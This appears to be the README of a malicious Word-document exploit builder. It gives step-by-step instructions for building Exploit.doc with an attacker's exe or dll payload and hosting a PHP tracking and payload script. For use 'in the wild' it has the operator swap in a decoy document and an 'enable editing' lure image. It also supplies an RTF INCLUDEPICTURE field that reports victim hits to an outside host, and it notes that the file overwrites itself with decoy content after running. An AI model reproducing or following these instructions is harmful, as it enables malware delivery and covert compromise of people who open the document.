[QUICK START]:

1)Install python 2.7
2)Place folder with builder to C:\Python27 folder
3)Add windows permissions to write on builder folder
4)Edit build_with_exe.bat with your t.php path
5)Run build_with_exe.bat to build
6)Exploit.doc and t.php files will appear in ready_exploit subfolder
7)Upload t.php to your webhosting by specified on step 4 path
8)chmod 777 on folder where you uploaded t.php
9)Run t.php?act=install
10)Run Exploit.doc to test

P.S. If you use dll instead of exe then make actions above with build_with_dll.bat file instead of build_with_exe.bat file.

=======================================================================================================

[IN THE WILD USE]:

Replace exe.exe with your exe, decoy.doc with your doc, enable_editing.jpg with your picture and run build_with_exe.bat again


=======================================================================================================

[STATISTICS]:

Use t.php?stats=show to see statistics

[HIT STATISTICS]

To get hit statistics your decoy.doc needs to download picture from t.php?act=hit
So you need to integrate picture to your decoy.doc manually
For example you need to add the following code to decoy.doc if you use rtf file format:
{\field\v{\*\fldinst{INCLUDEPICTURE "http://test1.ru/newbuild/t.php?act=hit" MERGEFORMAT \\d \\w0001 \\h0001 \\pm1 \\px0 \\py0 \\pw0}}}


=======================================================================================================

[TESTING]:

Exploit overwrites itself with decoy content after successful hit.
So you need to build file again before you will open it again for testing.